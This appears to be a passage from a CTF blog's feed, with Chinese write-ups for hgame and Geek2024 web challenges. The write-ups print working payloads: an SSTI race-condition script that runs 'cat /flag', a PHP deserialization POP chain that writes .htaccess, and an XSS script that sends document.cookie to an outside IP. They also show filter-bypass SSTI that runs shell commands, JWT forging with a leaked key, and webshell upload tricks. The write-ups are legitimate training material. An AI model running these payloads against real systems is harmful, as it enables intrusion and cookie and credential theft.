class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(message) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line"><span class="keyword">return</span> render_template_string(show)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>重点关注read接口<br>一个括号都不给，乍一看没法ssti<br>但是我发现这个接口有问题，readmsg()进行了两次<br>一次判断一次实装<br>那么就可以以先通过判断再执行的方式绕过这个waf<br>第一次的消息大一点，读取进来之后有延时的效果<br>构造一个多线程的脚本:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message</span>(<span class="params">message</span>):</span><br><span class="line">    url = <span class="string">&#x27;http://node1.hgame.vidar.club:32567/app/send&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;message&#x27;</span>: message&#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;发送消息 &#x27;<span class="subst">&#123;message&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>():</span><br><span class="line">    url = <span class="string">&#x27;http://node1.hgame.vidar.club:32567/app/read&#x27;</span></span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;读取文件响应：<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    send_message(<span class="string">&quot;a&quot;</span>*<span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line">    thread_read = threading.Thread(target=read_file)</span><br><span class="line">    thread_send = threading.Thread(target=send_message, args=(<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[140].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    thread_send.start()</span><br><span class="line">    thread_read.start()</span><br><span class="line">    </span><br><span class="line">    thread_send.join()</span><br><span class="line">    thread_read.join()</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;You-f1Nd-thE-Key_TO-RRRACE-OUUuut295edce&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write_up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>geek2024</title>
      <link href="/2025/03/07/geek2024/"/>
      <url>/2025/03/07/geek2024/</url>
      
        <content type="html"><![CDATA[<h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="variable">$this</span>-&gt;starven))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;starven,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$this</span>-&gt;starven);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;J1rry)==<span class="string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;meimeng-&gt;source;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;meimeng;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Challenge</span> = <span class="variable language_">$this</span>-&gt;GSBP;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Challenge</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;GSBP-&gt;<span class="title function_ invoke__">Getflag</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Just do it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/meimeng/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，发现:</p><ul><li>漏洞利用点在<code>SYC</code>类的<code>file_put_contents</code>中</li><li>反序列化起始点在<code>lover</code>类</li><li>pop链逻辑为 lover(destruct) -&gt; Geek(get) -&gt; lover(invoke) -&gt; Geek(tostring) -&gt; SYC(call)</li></ul><p>poc如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class SYC&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$starven</span> = <span class="string">&quot;php://filter/write=string.strip_tags|?&gt;php_value auto_prepend_file &#x27;/flag&#x27;\n#/resource=.htaccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class lover&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$J1rry</span>=<span class="string">&#x27;data://text/plain;base64,V2VsY29tZSBHZWVrQ2hhbGxlbmdlIDIwMjQ=&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$meimeng</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Geek&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$GSBP</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;meimeng-&gt;GSBP-&gt;meimeng-&gt;GSBP = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;abcabc&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;s%3A7%3A%22meimeng&#x27;</span>,<span class="string">&#x27;S%3A7%3A%22%5C6deimeng&#x27;</span>,<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure><p>需要注意的绕过点:</p><ul><li>十六进制绕过<code>$meimeng</code>的正则匹配</li><li>伪协议绕过<code>$J1rry</code>的<code>file_get_content</code></li><li>绕过死亡<code>exit</code>的大部分<code>filter</code>被ban，只能使用<code>strip_tags</code>写.htaccess进行文件包含</li></ul><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a>Problem_On_My_Web</h3><p>XSS题目<br><img src="/2025/03/07/geek2024/8GLFB4F8_2AE3U36QMA9U.png" alt="alt text"><br>发现不仅是starven学长能发表白语句，我们也能发<br>于是考虑<code>ssti模版注入</code><br>但尝试了多种模版注入，发现没有，但是有<code>XSS</code><br>点击下方第二个超链接,提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If you could tell me where my website has a problem,i would give you a gift in my cookies!!! [Post url=]</span><br></pre></td></tr></table></figure><p>使用POST传参,随意一个url,提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your host must be 127.0.0.1 and can be visit</span><br></pre></td></tr></table></figure><p>传参<code>url=http://127.0.0.1</code><br>提示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I have checked your url</span><br></pre></td></tr></table></figure><p>猜测可能会浏览和我们同样的表白墙，加之上方提示cookie中有gift,确认是XSS<br>构造劫持cookie的js:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">on_on_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://120.76.159.54:3389&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="variable language_">document</span>.<span class="property">cookie</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data))</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = on_on_load;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>提交后获得cookie,成功找到flag</p><h3 id="100-的⚪"><a href="#100-的⚪" class="headerlink" title="100%的⚪"></a>100%的⚪</h3><p>flag写js里了，属于签到题<br><img src="/2025/03/07/geek2024/1IITXLBMWMON72D.png" alt="alt text"><br>base64解码得到flag</p><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p>php绕过，题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一个<code>start</code>参数传递一个数组绕过<br>看一下<code>md5(&quot;Geekchallenge2024_bmKtL&quot;)</code>的值，为<code>0e</code>开头,且判断为弱判断<br>传参:<code>_[2024.geekchallenge.ctf=aaroZmOk</code>绕过<br>最后一个<code>year</code>是强制类型转换，传参<code>1e9</code>成功绕过</p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a>baby_upload</h3><p>文件上传<br><img src="/2025/03/07/geek2024/S6ZCG8TUVLB~M4N66RYCY%602.png" alt="alt text"><br>提示是黑名单绕过,那就一个一个尝试<br>发现<code>.jpg.php</code>双写成功绕过，使用蚁剑上马</p><h3 id="ezhttp"><a href="#ezhttp" class="headerlink" title="ezhttp"></a>ezhttp</h3><p>题目总览如下:<br>Please pass these levels,Starven will give you flag!<br>Level1: please use get parameter welcome<br>Level2 please user two post params username &amp; password<br>Level3 you must from <a href="https://www.sycsec.com/">https://www.sycsec.com</a><br>Level4 you must from local ip<br>Level5 you must let Starven give you flag<br><code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php\r<br></span><span style="color: #007700">if&nbsp;(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">[</span><span style="color: #DD0000">"HTTP_STARVEN"</span><span style="color: #007700">]&nbsp;==&nbsp;</span><span style="color: #DD0000">"I_Want_Flag"</span><span style="color: #007700">)&nbsp;&#123;\r<br>&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"........"</span><span style="color: #007700">;\r<br>&#125;\r<br></span>\n</span>\n</code>haha! Thers is last level,please view your cookie and get flag!<br>where is key?<br>give your cookie : token &#x3D; eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3Mjk4NjQzNDQsIm5iZiI6MTcyOTg2NDM0NCwiZXhwIjoxNzI5ODcxNTQ0LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6ZmFsc2V9.HD4hxKoLUf7lhML184qng96EZiTlMTTtgAD8mvyDLCk<br><!--key is "Starven_secret_key"--><br></p><p>最后python代码如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://80-c245227a-02f4-44c0-82e8-7da81ef7f405.challenge.ctfplus.cn/?welcome=geekchallenge2024&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.sycsec.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Real-Ip&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;STARVEN&#x27;</span>:<span class="string">&#x27;I_Want_Flag&#x27;</span>,</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;Starven&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;qwert123456&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJTdGFydmVuIiwiYXVkIjoiQ3RmZXIiLCJpYXQiOjE3Mjk4NjIyNTcsIm5iZiI6MTcyOTg2MjI1NywiZXhwIjoxNzI5ODY5NDU3LCJ1c2VybmFtZSI6IlN0YXJ2ZW4iLCJwYXNzd29yZCI6InF3ZXJ0MTIzNDU2IiwiaGFzRmxhZyI6dHJ1ZX0.1vbIIz51Roat6PffQNLLraYywbeWqemHz3_uhvkGWvA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,headers=headers,data=data,cookies=cookie)</span><br></pre></td></tr></table></figure><p>本题需要注意的点:</p><ul><li>伪造ip除了可以用<code>x-forwarded-for</code>还可以用<code>X-Real-Ip</code></li><li>jwt解密token后为<code>python &#123; &quot;iss&quot;: &quot;Starven&quot;, &quot;aud&quot;: &quot;Ctfer&quot;, &quot;iat&quot;: 1729862257, &quot;nbf&quot;: 1729862257, &quot;exp&quot;: 1729869457, &quot;username&quot;: &quot;Starven&quot;, &quot;password&quot;: &quot;qwert123456&quot;, &quot;hasFlag&quot;: false &#125;</code><br>将hasFlag改成true后使用Starven_secret_key加密回去即可获得flag</li></ul><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><p>发现有ssti<br>首先查找过滤字符，<br>发现:<br>过滤:<code>[]、+、request、关键字、:、set、get</code><br>不过滤:<code>&quot;&quot;、__、.、attr、reverse</code><br>既然<code>attr</code>可以用我们就使用<code>reverse</code>进行组合:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse))%&#125;</span><br></pre></td></tr></table></figure><p>成功找到subclasses,虽然python环境未知，但大多在130附近，我们先取132，再根据得到的对象一个一个数找附近wrap_close<br>最后找到是140<br>构造可执行系统命令的语句:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)())%&#125;</span><br></pre></td></tr></table></figure><p>发现flag、\、等字符被ban，用十六进制替换</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;cat \x2f\x66\x6c\x61\x67&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)())%&#125;</span><br></pre></td></tr></table></figure><p>最后发现还过滤了flag的回显，直接用env就行,再进行一次reverse:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">print</span>(()|attr(<span class="string">&#x27;__ssalc__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__esab__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__sessalcbus__&#x27;</span>|reverse)()|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="number">140</span>)|attr(<span class="string">&#x27;__tini__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__slabolg__&#x27;</span>|reverse)|attr(<span class="string">&#x27;__metiteg__&#x27;</span>|reverse)(<span class="string">&#x27;nepop&#x27;</span>|reverse)(<span class="string">&quot;env&quot;</span>)|attr(<span class="string">&#x27;daer&#x27;</span>|reverse)()|reverse)%&#125;</span><br></pre></td></tr></table></figure><p>再使用python倒转flag:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;e3444c55cb6a-a919-3c94-583e-9ea58050&#123;CYS&#x27;</span>[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>成功解出</p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h3><p>查看网站源码发现登录界面:L000G1n.php</p><p>提示用户名4~16位，猜测为<code>admin</code><br>提示密码3位+@chengxing,爆破得<code>SYC@chengxing</code><br>成功进入后台</p><p>发现广告界面可以修改广告的php<br>过滤了很多危险函数,但使用的并不是disable_functions<br>直接拼接即可绕过:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;sys&quot;</span>.<span class="string">&quot;tem&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&quot;env&quot;</span>);</span><br></pre></td></tr></table></figure><p>获得flag:<code>SYC&#123;289537ce-182e-4096-93fe-aeb80e53b094&#125;</code></p><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="ez-include"><a href="#ez-include" class="headerlink" title="ez_include"></a>ez_include</h3><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;starven_secret.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/starven_secret.php/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还想非预期?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 